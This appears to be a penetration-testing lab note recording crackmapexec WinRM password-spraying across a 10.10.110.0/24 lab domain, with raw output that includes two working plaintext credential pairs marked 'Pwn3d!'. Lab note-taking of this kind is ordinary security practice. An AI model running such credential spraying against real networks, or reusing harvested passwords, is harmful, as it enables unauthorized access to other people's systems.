# credentials for test, Ferus, and Administrator

```bash
┌──(kali㉿gobots)-[04Apr2024 15:29:10]-[~/SUT]                                                                                                                                                              
└─$ crackmapexec winrm 10.10.110.0/24 -u userlist -p passwordlist                                                                                                                                           
SMB         10.10.110.3     5985   DC01-PHOBOS      [*] Windows 10.0 Build 17763 (name:DC01-PHOBOS) (domain:genesis.local)               
SMB         10.10.110.5     5985   SRV01-ARTEMIS    [*] Windows 10.0 Build 17763 (name:SRV01-ARTEMIS) (domain:SRV01-Artemis)             
SMB         10.10.110.25    5985   WS02-ATHENA      [*] Windows 10.0 Build 19041 (name:WS02-ATHENA) (domain:WS02-Athena)                 
HTTP        10.10.110.5     5985   SRV01-ARTEMIS    [*] http://10.10.110.5:5985/wsman                                                    
HTTP        10.10.110.3     5985   DC01-PHOBOS      [*] http://10.10.110.3:5985/wsman                                                    
HTTP        10.10.110.25    5985   WS02-ATHENA      [*] http://10.10.110.25:5985/wsman                                                   
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\test:t3st123                                                       
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\test:MeatLoaf007                                                   
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\test:LongAgoFarAway                                                
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\Ferus:t3st123                                                      
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\Ferus:MeatLoaf007                                                  
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\Ferus:LongAgoFarAway                                               
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\Administrator:t3st123                                              
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\Administrator:MeatLoaf007       
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\Administrator:LongAgoFarAway 
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\Administrator:t3st123
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\Administrator:MeatLoaf007
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [-] SRV01-Artemis\Administrator:LongAgoFarAway
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\test:t3st123
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\test:MeatLoaf007
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\test:LongAgoFarAway
SMB         10.10.110.58    5985   SQL01-HERA       [*] Windows 10.0 Build 14393 (name:SQL01-HERA) (domain:SQL01-Hera)
HTTP        10.10.110.58    5985   SQL01-HERA       [*] http://10.10.110.58:5985/wsman
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\Ferus:t3st123
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\Ferus:MeatLoaf007
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\Ferus:LongAgoFarAway
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\Administrator:t3st123
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\Administrator:MeatLoaf007
WINRM       10.10.110.3     5985   DC01-PHOBOS      [-] genesis.local\Administrator:LongAgoFarAway
WINRM       10.10.110.58    5985   SQL01-HERA       [-] SQL01-Hera\test:t3st123
SMB         10.10.110.213   5985   WEBWIN01-APOLLO  [*] Windows 6.3 Build 9600 (name:WEBWIN01-APOLLO) (domain:WEBWIN01-Apollo)
HTTP        10.10.110.213   5985   WEBWIN01-APOLLO  [*] http://10.10.110.213:5985/wsman
WINRM       10.10.110.58    5985   SQL01-HERA       [-] SQL01-Hera\test:MeatLoaf007
WINRM       10.10.110.58    5985   SQL01-HERA       [-] SQL01-Hera\test:LongAgoFarAway
WINRM       10.10.110.58    5985   SQL01-HERA       [-] SQL01-Hera\Ferus:t3st123
WINRM       10.10.110.58    5985   SQL01-HERA       [-] SQL01-Hera\Ferus:MeatLoaf007
WINRM       10.10.110.58    5985   SQL01-HERA       [-] SQL01-Hera\Ferus:LongAgoFarAway
WINRM       10.10.110.58    5985   SQL01-HERA       [-] SQL01-Hera\Administrator:t3st123
WINRM       10.10.110.58    5985   SQL01-HERA       [-] SQL01-Hera\Administrator:MeatLoaf007
WINRM       10.10.110.58    5985   SQL01-HERA       [-] SQL01-Hera\Administrator:LongAgoFarAway
ERROR:pypsrp.wsman:Failed to parse WSManFault message on WinRM error response, raising original WinRMTransportError
WINRM       10.10.110.25    5985   WS02-ATHENA      [-] WS02-Athena\test:t3st123 "Bad HTTP response returned from the server. Code: 415, Content: ''"
ERROR:pypsrp.wsman:Failed to parse WSManFault message on WinRM error response, raising original WinRMTransportError
WINRM       10.10.110.25    5985   WS02-ATHENA      [-] WS02-Athena\test:MeatLoaf007 "Bad HTTP response returned from the server. Code: 415, Content: ''"
ERROR:pypsrp.wsman:Failed to parse WSManFault message on WinRM error response, raising original WinRMTransportError
WINRM       10.10.110.25    5985   WS02-ATHENA      [-] WS02-Athena\test:LongAgoFarAway "Bad HTTP response returned from the server. Code: 415, Content: ''"
WINRM       10.10.110.25    5985   WS02-ATHENA      [-] WS02-Athena\Ferus:t3st123
WINRM       10.10.110.25    5985   WS02-ATHENA      [+] WS02-Athena\Ferus:MeatLoaf007 (Pwn3d!)
WINRM       10.10.110.213   5985   WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\test:t3st123
WINRM       10.10.110.213   5985   WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\test:MeatLoaf007
WINRM       10.10.110.213   5985   WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\test:LongAgoFarAway
WINRM       10.10.110.213   5985   WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Ferus:t3st123
WINRM       10.10.110.213   5985   WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Ferus:MeatLoaf007
WINRM       10.10.110.213   5985   WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Ferus:LongAgoFarAway
WINRM       10.10.110.213   5985   WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Administrator:t3st123
WINRM       10.10.110.213   5985   WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Administrator:MeatLoaf007
WINRM       10.10.110.213   5985   WEBWIN01-APOLLO  [-] WEBWIN01-Apollo\Administrator:LongAgoFarAway

```



```bash
┌──(kali㉿gobots)-[18Apr2024 16:37:23]-[~/SUT]                                                                                                    
└─$ crackmapexec winrm 10.10.110.0/24 -u userlist -p passwordlist                                                                                                                                          
WINRM       10.10.110.25    5985   WS02-ATHENA      [+] WS02-Athena\Ferus:MeatLoaf007 (Pwn3d!)                                                            
WINRM       10.10.110.5     5985   SRV01-ARTEMIS    [+] SRV01-Artemis\rbiscuit:pRdJh3RpL2 (Pwn3d!)  
```
![[Pasted image 20240418123906.png]]